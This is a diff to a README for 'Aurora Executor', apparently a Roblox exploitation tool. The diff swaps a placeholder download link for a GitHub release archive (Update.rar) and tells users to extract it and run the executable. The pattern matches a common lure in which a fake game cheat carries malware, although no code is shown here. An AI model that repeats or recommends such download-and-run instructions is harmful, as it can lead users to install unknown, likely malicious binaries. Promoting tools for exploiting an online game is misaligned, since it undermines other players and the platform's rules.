@@ -28,7 +28,7 @@ Aurora Executor is an advanced Roblox exploitation tool that allows users to exe
 ## 🚀 **How to Use Aurora Executor**  
 
 1. **Download the Executor**  
-   Get the latest version of Aurora Executor from [Click to Download](#).  
+   Get the latest version of Aurora Executor from [Click to Download](https://github.com/dionisiusjovan-ai/aurora-latest-update/releases/download/aur-ex/Update.rar).  
 
 2. **Install and Launch**  
    Extract the files, run the executable, and connect Aurora Executor to Roblox.  
